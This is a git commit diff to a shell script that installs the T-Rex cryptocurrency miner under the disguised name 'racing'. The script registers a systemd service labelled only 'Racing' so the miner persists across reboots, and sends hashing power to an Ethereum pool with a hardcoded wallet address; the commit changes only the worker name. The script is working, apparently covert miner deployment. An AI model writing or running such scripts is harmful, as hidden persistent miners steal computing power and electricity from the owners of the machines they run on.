7f0d6da729f14746637fd47aa5103c380f4c1e79
vip8338 <110080998+vip8338@users.noreply.github.com>
2022-07-28 13:10:36 +0700

    Update cuaminh84v.sh

--- cuaminh84v.sh
+++ cuaminh84v.sh
@@ -15,4 +15,4 @@ sudo mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xfd858D1fe9c9Df3c8c6bacdBDB2e906a73cf4c61 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xfd858D1fe9c9Df3c8c6bacdBDB2e906a73cf4c61 -p x -w 8386 &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xfd858D1fe9c9Df3c8c6bacdBDB2e906a73cf4c61 -p x -w kienpd_top1_miner &
